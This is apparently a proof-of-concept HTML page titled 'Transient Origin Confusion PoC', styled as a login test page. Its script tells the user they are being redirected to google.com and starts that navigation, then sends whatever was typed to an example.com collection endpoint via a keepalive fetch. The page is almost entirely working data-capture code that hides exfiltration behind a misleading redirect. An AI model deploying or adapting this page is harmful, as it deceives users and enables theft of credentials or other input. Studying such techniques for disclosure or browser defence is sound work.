<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Transient Origin Confusion PoC</title>
<style>
body {
  font-family: Arial, sans-serif;
  padding: 40px;
}
input, button {
  padding: 10px;
  font-size: 16px;
  margin-top: 10px;
}
#status {
  margin-top: 20px;
  font-size: 14px;
  color: #444;
}
</style>
</head>

<body>

<h2>Login (Test Page)</h2>
<p>Enter any text and click submit.</p>

<input id="data" placeholder="Type here">
<br>
<button onclick="go()">Submit</button>

<div id="status"></div>

<script>
function go() {
  document.getElementById("status").innerText =
    "Redirecting to google.com...";

  // Kirim data SETELAH navigasi dimulai
  setTimeout(() => {
    fetch("https://example.com/collect", {
      method: "POST",
      body: document.getElementById("data").value,
      keepalive: true
    });
  }, 30);

  // Trigger navigation
  location.href = "https://www.google.com";
}
</script>

</body>
</html>
